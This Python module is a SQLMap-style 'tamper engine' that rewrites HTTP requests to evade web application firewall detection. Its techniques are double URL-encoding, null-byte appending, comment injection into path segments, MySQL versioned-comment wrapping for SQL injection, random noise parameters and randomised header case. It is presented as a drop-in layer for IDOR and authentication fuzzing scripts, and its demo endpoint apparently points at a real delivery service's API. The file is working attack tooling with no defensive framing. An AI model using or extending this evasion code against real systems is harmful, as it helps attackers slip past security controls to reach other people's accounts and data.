#!/usr/bin/env python3
"""
tamper_engine.py — SQLMap-inspired payload obfuscation for HTTP requests.

Applies tamper techniques to paths, query params, headers, and bodies
to evade WAF signature detection. Used as a drop-in layer for doorbash-idor.py
and auth-fuzzer.py.

Techniques:
1. charencode     — URL-encode special chars in paths/params
2. randomcase     — Randomize header case (Content-Type → coNteNt-TYpe)
3. nullbyte       — Append %00 to paths
4. doublencode    — Double URL-encode query values
5. space2plus     — Replace spaces with + in query params
6. randomparams   — Add random noise query params to break cache patterns
7. commentinject  — Inject /**/ into path segments
8. modsecurity    — MySQL versioned comment wrapping on params
"""

import random
import string
from urllib.parse import quote, urlencode, quote_plus


def tamper_charencode(path, query, body):
    """URL-encode special characters in path."""
    encoded_path = quote(path, safe="/?&=@")
    return encoded_path, query, body


def tamper_randomcase(headers):
    """Randomize header name casing."""
    new_headers = {}
    for k, v in headers.items():
        new_key = ''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in k
        )
        new_headers[new_key] = v
    return new_headers


def tamper_nullbyte(path, query, body):
    """Append URL-encoded null byte to path."""
    null_chars = ["%00", "%2500"]
    nc = random.choice(null_chars)
    return path + nc, query, body


def tamper_doublencode(path, query, body):
    """Double URL-encode query param values."""
    if query:
        new_query = {}
        for k, v in query.items():
            if isinstance(v, str):
                new_query[k] = quote(quote(v, safe=''), safe='')
            elif isinstance(v, list):
                new_query[k] = [quote(quote(x, safe=''), safe='') for x in v]
            else:
                new_query[k] = v
        return path, new_query, body
    return path, query, body


def tamper_space2plus(path, query, body):
    """Replace spaces in query values with +."""
    if query:
        new_query = {}
        for k, v in query.items():
            if isinstance(v, str):
                new_query[k] = v.replace(' ', '+')
            elif isinstance(v, list):
                new_query[k] = [x.replace(' ', '+') for x in v]
            else:
                new_query[k] = v
        return path, new_query, body
    return path, query, body


def tamper_randomparams(path, query, body):
    """Add random noise query parameters to break WAF cache patterns."""
    new_query = dict(query) if query else {}
    # Add 1-3 random params
    for _ in range(random.randint(1, 3)):
        key = ''.join(random.choice(string.ascii_lowercase) for _ in range(random.randint(3, 8)))
        val = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(random.randint(3, 10)))
        new_query[key] = val
    return path, new_query, body


def tamper_commentinject(path, query, body):
    """Inject /**/ into path segments to break WAF pattern matching."""
    parts = path.split('/')
    if len(parts) > 2:
        idx = random.randint(1, len(parts) - 1)
        if parts[idx]:
            parts[idx] = f"/*{random.randint(100, 999)}*/{parts[idx]}"
    return '/'.join(parts), query, body


def tamper_modsecurity(path, query, body):
    """Wrap query values in MySQL versioned comments."""
    if query:
        new_query = {}
        for k, v in query.items():
            if isinstance(v, str):
                new_query[k] = f"/*!50000{v}*/"
            else:
                new_query[k] = v
        return path, new_query, body
    return path, query, body


# Core tampers (safe for REST APIs)
TAMPERS = [
    tamper_charencode,
    tamper_nullbyte,
    tamper_doublencode,
    tamper_space2plus,
    tamper_randomparams,
    tamper_commentinject,
]

# SQL-only tampers (for SQLi targets — wraps values in MySQL comments)
SQL_TAMPERS = [
    tamper_modsecurity,
]


def apply_random_tampers(path, query, body, count=2):
    """Apply a random subset of tamper techniques."""
    selected = random.sample(TAMPERS, min(count, len(TAMPERS)))
    for tamper_func in selected:
        path, query, body = tamper_func(path, query, body)
    return path, query, body


def apply_tampered_headers(headers):
    """Apply header obfuscation. Call separately before sending request."""
    return tamper_randomcase(headers)


def apply_all_tampers(path, query, body):
    """Apply all tamper techniques sequentially (most aggressive)."""
    for tamper_func in TAMPERS:
        path, query, body = tamper_func(path, query, body)
    return path, query, body


# ── CLI test ──
if __name__ == "__main__":
    path = "/v1/dashers/me"
    query = {"id": "9", "user": "test"}
    body = {"query": "SELECT * FROM users"}

    print("Original:", path, query, body)
    print()
    print("All tampers:")
    p, q, b = apply_all_tampers(path, dict(query), dict(body))
    print("  Path:", p)
    print("  Query:", q)
    print("  Body:", b)
    print()
    print("Random (x3):")
    for i in range(3):
        p, q, b = apply_random_tampers(path, dict(query), dict(body))
        print(f"  [{i}] Path: {p}")
        print(f"       Query: {q}")
